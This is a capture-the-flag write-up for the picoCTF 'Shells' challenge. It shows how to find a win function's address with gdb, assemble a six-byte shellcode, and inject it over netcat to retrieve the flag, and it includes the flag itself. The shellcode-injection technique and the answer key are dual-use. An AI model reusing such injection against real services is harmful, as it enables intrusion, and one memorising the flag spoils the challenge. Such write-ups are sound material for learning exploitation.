# Shells
## level 2 - binary exploitation - 70 points

### Description
> How much can a couple bytes do? Use [shells](./data/shells)! [Source](./data/shells.c). Connect on shell2017.picoctf.com:17533.

### Hints
> * Read about basic shellcode
> * You don't need a full shell (yet...), just enough to get the flag

### Description

Like the [previous challenge](../shellz) we can inject some shellcode to perform arbitrary actions, but this time the byte constraint is stricter: only 10 bytes. The other difference is the `win` function, now uncommented and so compiled. So the plan is:

* Search for `win` function address
* Assemble shellcode to jump to `win` function
* Inject shellcode with Python

To retrieve `win` function address I used `gdb`:

```
$ gdb shells
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1
...
Reading symbols from shells...(no debugging symbols found)...done.
(gdb) print win
$1 = {<text variable, no debug info>} 0x8048540 <win>
```

So, `win` function address is `0x8048540`. Now we have to craft the shellcode: the assembly code to go to `win` function is this:

```asm
push 0x8048540
ret
```

We can use an [online assembler](https://defuse.ca/online-x86-assembler.htm) to get the bytes or use `nasm` to assemble locally: write in a `.s` file the source of ASM code to assembly and run `nasm`, then retrieve the shellcode with `objdump`:

```
$ nasm -f elf shells.o
$ objdump -d shells.o

shells.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:   68 40 85 04 08          push   $0x8048540
   5:   c3                      ret
```

So the shellcode is `\x68\x40\x85\x04\x08\xc3`, now we can use Python like previous challenge to submit and get the flag:

```
$ (python -c 'print "\x68\x40\x85\x04\x08\xc3"'; cat -) | nc shell2017.picoctf.com 17533
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 10 bytes:
4350d27b024f8597f10b98f164f0fc43
```

### Flag
```
4350d27b024f8597f10b98f164f0fc43
```